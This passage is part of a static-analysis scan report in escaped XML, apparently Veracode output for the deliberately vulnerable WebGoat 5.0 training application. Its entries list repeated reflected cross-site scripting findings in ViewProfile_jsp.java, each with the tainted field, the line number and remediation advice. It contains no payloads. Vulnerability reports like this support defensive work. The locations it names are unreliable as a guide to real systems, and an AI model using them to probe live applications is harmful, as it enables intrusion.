        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"59\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"60\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"60\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"181\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"60\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"250\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"61\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"163\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"62\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"30\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"216\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"62\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"30\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"259\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"63\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"29\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"242\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"64\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"32\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"194\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"64\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"32\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"171\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"65\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"31\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"116\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"66\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"34\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"155\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"66\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"34\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
